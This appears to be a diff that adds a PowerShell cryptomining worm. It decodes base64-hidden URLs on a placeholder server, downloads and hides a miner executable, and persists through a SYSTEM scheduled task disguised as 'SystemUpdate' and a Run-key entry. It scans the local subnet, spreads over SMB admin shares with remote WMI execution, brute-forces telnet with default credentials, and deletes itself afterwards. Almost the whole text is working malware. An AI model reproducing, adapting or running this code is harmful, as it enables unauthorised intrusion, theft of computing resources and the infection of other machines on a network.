@@ -1,0 +1,97 @@
+# ==== DYNAMICALLY FETCHED WALLET & POOL, NOTHING STORED LOCALLY ====
+
+$U = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL1lPVVJfU0VSVkVSX0lQOjgwODAvdTk0ZzFuN3guZXhl'))
+$WURL = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL1lPVVJfU0VSVkVSX0lQOjgwODAvcTloMmsxczMudHh0'))
+$PURL = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL1lPVVJfU0VSVkVSX0lQOjgwODAvejhsNG02YjUudHh0'))
+$X = "$($env:PUBLIC)$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XGhlbHBjdHIuZXhl')))"
+
+function Fetch($url) { return (Invoke-WebRequest -Uri $url -Headers @{ 'User-Agent' = 'hi' } -UseBasicParsing).Content.Trim() }
+
+$w = Fetch $WURL
+$p = Fetch $PURL
+
+if (-not (Test-Path $X)) {
+    try {
+        Invoke-WebRequest -Uri $U -OutFile $X -Headers @{ 'User-Agent' = 'hi' } -UseBasicParsing -ea SilentlyContinue
+        attrib +h $X
+    } catch {}
+}
+
+$T = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtVXBkYXRl'))
+try {
+    schtasks /Create /TN $T /TR $X /SC ONLOGON /RL HIGHEST /F /RU "SYSTEM" | Out-Null
+    schtasks /Change /TN $T /HIDDEN | Out-Null
+} catch {}
+try {
+    Set-ItemProperty -Path ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SEtDVTo7U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgQ3VycmVudFZlcnNpb25cUnVu'))) -Name $T -Value $X -Force
+} catch {}
+
+$m = (Get-NetIPAddress -AddressFamily IPv4 | ? { $_.IPAddress -notlike "169.*" -and $_.PrefixOrigin -eq "Dhcp" }).IPAddress
+$b = ($m -split '\.')[0..2] -join '.'
+$Q = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NDQ1LDgwLDgwODAsNTAwMCw1NTQsOTEwMCwyMw==')) -split ','
+
+foreach ($i in 1..254) {
+    $t = "$b.$i"
+    foreach ($pt in $Q) {
+        try {
+            $c = New-Object Net.Sockets.TcpClient
+            $c.Connect($t, [int]$pt)
+            if ($c.Connected) {
+                $c.Close()
+                if ($pt -eq 445) {
+                    try {
+                        $d = "\\$t\C$\Users\Public\helpctr.exe"
+                        Copy-Item $X $d -Force -ea SilentlyContinue
+                        $a = "$d -a rx -o $p -u $w --cpu-max-threads-hint=30"
+                        Invoke-WmiMethod -Class Win32_Process -ComputerName $t -Name Create -ArgumentList $a -ea SilentlyContinue
+                    } catch {}
+                }
+                elseif ($pt -in 80,8080,5000) {
+                    try {
+                        $uri = "http://$t:$pt"
+                        $r = Invoke-WebRequest -Uri $uri -UseBasicParsing -TimeoutSec 2 -ea SilentlyContinue
+                    } catch {}
+                }
+                elseif ($pt -eq 554) { }
+                elseif ($pt -eq 9100) { }
+                elseif ($pt -eq 23) {
+                    $U1=@(
+                        'YWRtaW4=','cm9vdA==','dXNlcg==','Z3Vlc3Q=','c3VwcG9ydA==','YWRtaW5pc3RyYXRvcg==',
+                        'ZGVmYXVsdA==','c3VwZXJ1c2Vy','cGk=','ZnRw','dGVzdA==','b3BlcmF0b3I=','c2VydmljZQ=='
+                    ) | % { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_)) }
+                    $P1=@(
+                        'YWRtaW4=','cm9vdA==','cGFzc3dvcmQ=','MTIzNA==','MTIzNDU=','MTIzNDU2','MTIzNDU2Nw==',
+                        'MTIzNDU2Nzg=','dXNlcg==','Z3Vlc3Q=','c3VwcG9ydA==','YWRtaW5pc3RyYXRvcg==','MTExMQ==',
+                        'MTIz','MTIzMTIz','dGVzdA==','ODg4OA==','MDAwMA==','Y2hhbmdlbWU=','cGFzcw==','YWJjMTIz',
+                        'c3VwZXJ1c2Vy','c2VydmljZQ==','cmFzcGJlcnJ5','c3lzdGVt','cXdlcnR5'
+                    ) | % { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_)) }
+                    foreach ($u1 in $U1) {
+                        foreach ($p1 in $P1) {
+                            try {
+                                $cl = New-Object System.Net.Sockets.TcpClient($t,23)
+                                $st = $cl.GetStream()
+                                $w1 = New-Object System.IO.StreamWriter($st)
+                                $r1 = New-Object System.IO.StreamReader($st)
+                                Start-Sleep -Milliseconds 300
+                                $w1.WriteLine($u1);$w1.Flush()
+                                Start-Sleep -Milliseconds 200
+                                $w1.WriteLine($p1);$w1.Flush()
+                                Start-Sleep -Milliseconds 300
+                                $res = "";if($st.DataAvailable){$res=$r1.ReadToEnd()}
+                                if ($res -like "*Welcome*" -or $res -like "*#*" -or $res -like "*$*") {
+                                    $w1.Close();$r1.Close();$cl.Close();break
+                                }
+                                $w1.Close();$r1.Close();$cl.Close()
+                            } catch {}
+                        }
+                    }
+                }
+            }
+        } catch {}
+    }
+}
+
+Start-Sleep -Seconds 1
+Remove-Item -Path $MyInvocation.MyCommand.Path -Force
+
+# =========================================
